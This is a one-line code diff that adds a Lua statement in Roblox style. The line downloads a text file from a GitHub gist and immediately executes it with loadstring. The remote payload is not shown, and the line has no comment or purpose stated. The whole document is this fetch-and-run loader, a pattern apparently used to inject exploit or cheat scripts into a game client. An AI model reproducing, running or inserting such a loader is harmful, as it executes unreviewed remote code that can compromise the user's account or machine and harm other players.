@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/askin2k3-hash/efcb28e7d086fa913f5715941248165b/raw/76be3c2b0adde9877250851af497ca1c538664cc/gistfile1.txt"))()
